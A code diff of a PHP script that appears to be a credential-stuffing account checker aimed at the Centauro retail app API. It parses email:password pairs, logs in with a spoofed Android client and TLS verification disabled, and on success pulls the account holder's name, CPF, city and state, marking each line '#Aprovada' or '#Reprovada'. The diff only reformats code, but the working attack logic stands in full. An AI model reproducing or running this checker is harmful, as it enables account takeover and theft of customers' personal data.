@@ -31,8 +31,8 @@ $explode = multiexplode(array(
     "|",
     ":",
     " ",
-    "/"
-) , $lista);
+    "/",
+), $lista);
 $explode = array_values(array_filter($explode));
 @$email = trim($explode[0]);
 @$senha = trim($explode[1]);
@@ -43,8 +43,7 @@ function __curl($url, $post = false, $header = false, $method = false)
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_HEADER, 1);
-    if ($method)
-    {
+    if ($method) {
         curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
     }
     curl_setopt($ch, CURLOPT_ENCODING, "");
@@ -55,12 +54,10 @@ function __curl($url, $post = false, $header = false, $method = false)
     curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/casasbahia.txt');
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    if ($header)
-    {
+    if ($header) {
         curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
     }
-    if ($post)
-    {
+    if ($post) {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
     }
@@ -78,8 +75,8 @@ $d1 = __curl('https://api.centauro.appsbnet.com.br/v2.1/clientes/login', '{"usua
     "host: api.centauro.appsbnet.com.br",
     "user-agent: Centauro/1.8.1 (samsung greatlte; 4.4.2 API 19)",
     "x-client-useragent: android",
-    "x-cv-id: 14"
-) , 'POST');
+    "x-cv-id: 14",
+), 'POST');
 
 $token = getStr($d1, '"token":"', '",');
 $d2 = __curl('https://api.centauro.appsbnet.com.br/v3/clientes', false, array(
@@ -90,7 +87,7 @@ $d2 = __curl('https://api.centauro.appsbnet.com.br/v3/clientes', false, array(
     "user-agent: Centauro/1.8.1 (samsung greatlte; 4.4.2 API 19)",
     "x-client-token: " . $token . "",
     "x-client-useragent: android",
-    "x-cv-id: 14"
+    "x-cv-id: 14",
 ));
 
 $d3 = __curl('https://api.centauro.appsbnet.com.br/v2/endereco', false, array(
@@ -101,13 +98,12 @@ $d3 = __curl('https://api.centauro.appsbnet.com.br/v2/endereco', false, array(
     "user-agent: Centauro/1.8.1 (samsung greatlte; 4.4.2 API 19)",
     "x-client-token: " . $token . "",
     "x-client-useragent: android",
-    "x-cv-id: 14"
+    "x-cv-id: 14",
 ));
 
 $data = date("d/m/Y H:i:s");
 
-if (strpos($d1, 'primeiroAcesso'))
-{
+if (strpos($d1, 'primeiroAcesso')) {
     $n = getStr($d2, '"nome":"', '",');
     $sobrenome = getStr($d2, '"sobrenome":"', '",');
     $nome = "$n $sobrenome";
@@ -116,9 +112,6 @@ if (strpos($d1, 'primeiroAcesso'))
     $uf = getStr($d3, '"uf":"', '",');
 
     die('<font color="green" style="font-weight: bold;">#Aprovada</font> <font color="#D0D3D4">' . $lista . '| Nome: ' . $nome . ' | Cpf: ' . $cpf . ' | Cidade: ' . $cidade . ' | Estado: ' . $uf . '  </font> <font color="#333333"></font>');
-}
-else
-{
+} else {
     die('<font color="red" style="font-weight: #C0392B;">#Reprovada</font> ' . $lista . '  <font color="#333333"></font>');
 }
-?>
